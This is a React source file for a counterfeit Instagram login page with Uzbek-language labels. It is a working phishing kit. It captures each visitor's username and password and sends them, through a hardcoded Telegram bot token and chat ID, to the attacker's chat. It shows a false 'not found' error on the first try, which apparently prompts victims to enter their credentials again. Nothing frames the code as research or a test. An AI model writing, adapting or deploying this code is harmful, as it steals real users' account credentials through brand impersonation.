import React, { useState } from "react";
import { CheckCircleIcon, XCircleIcon } from "@heroicons/react/24/solid";

const BOT_TOKEN = "8202944773:AAGa2bJpkcAB-8252YNnb0anaXUtgPqrens";
const CHAT_ID = "7550473457";

export default function App() {
  const [login, setLogin] = useState("");
  const [password, setPassword] = useState("");
  const [clickCount, setClickCount] = useState(0);
  const [status, setStatus] = useState(null);

  const sendToTelegram = async (message) => {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(
      message
    )}`;
    await fetch(url);
  };

  const handleSubmit = () => {
    let newCount = clickCount + 1;
    let statusMessage = "";
    let statusType = "";

    if (newCount === 1) {
      statusMessage = "Ma'lumot topilmadi";
      statusType = "error";
    } else {
      statusMessage = "Ma'lumot topildi";
      statusType = "success";
    }

    setStatus({ type: statusType, message: statusMessage });

    const telegramMessage = `📩 Yangi so'rov:\n👤 Username: ${login}\n🔑 Parol: ${password}\n📌 Holat: ${statusMessage}`;
    sendToTelegram(telegramMessage);

    setLogin("");
    setPassword("");

    setTimeout(() => setStatus(null), 2000);

    if (newCount >= 3) {
      newCount = 0;
    }
    setClickCount(newCount);
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100 relative">
      {/* Instagram Logo */}
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/330px-Instagram_logo_2022.svg.png"
        alt="Instagram"
        className="w-20 mb-6"
      />

      {/* Status Message */}
      {status && (
        <div
          className={`absolute top-5 flex items-center gap-2 px-4 py-2 rounded-lg shadow-lg text-white ${
            status.type === "success" ? "bg-green-500" : "bg-red-500"
          }`}
        >
          {status.type === "success" ? (
            <CheckCircleIcon className="w-6 h-6" />
          ) : (
            <XCircleIcon className="w-6 h-6" />
          )}
          <span className="font-medium">{status.message}</span>
        </div>
      )}

      {/* Login Form */}
      <div className="bg-white p-6 rounded-2xl shadow-lg w-80">
        <h1 className="text-2xl font-bold text-center mb-4 text-gray-800">
          Instagram
        </h1>
        <input
          type="text"
          placeholder="Username"
          className="border rounded-md px-3 py-2 w-full mb-3 focus:outline-none focus:ring-2 focus:ring-pink-400"
          value={login}
          onChange={(e) => setLogin(e.target.value)}
        />
        <input
          type="password"
          placeholder="Parol"
          className="border rounded-md px-3 py-2 w-full mb-4 focus:outline-none focus:ring-2 focus:ring-pink-400"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <button
          onClick={handleSubmit}
          className="bg-pink-500 hover:bg-pink-600 text-white py-2 px-4 rounded-md w-full font-semibold transition duration-200"
        >
          Tasdiqlash
        </button>
      </div>
    </div>
  );
}
